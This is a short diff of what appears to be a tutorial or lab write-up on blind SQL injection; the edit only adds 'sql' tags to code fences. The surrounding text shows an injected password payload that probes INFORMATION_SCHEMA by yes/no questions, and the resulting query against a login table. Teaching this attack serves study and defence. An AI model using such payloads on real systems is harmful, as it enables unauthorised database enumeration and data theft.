@@ -252,7 +252,7 @@ There is a lot of stuff that can be found. But how can they be found? The code w
 
 We can now use this magical operator to ask the server yes or no questions and find out all the information we need. We can input anything into the username that doesn't mess with the query. I'll be using 'bar' without quotes. The following password queries were sent. The results are shown them.
 
-```
+```sql
 # Query 1
 ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 's%' AND TABLE_SCHEMA != 'information_schema') #
 
@@ -274,7 +274,7 @@ We can now use this magical operator to ask the server yes or no questions and f
 
 Resultant queries:
 
-```
+```sql
 # Query 1
 SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 's%' AND TABLE_SCHEMA != 'information_schema') #'
 
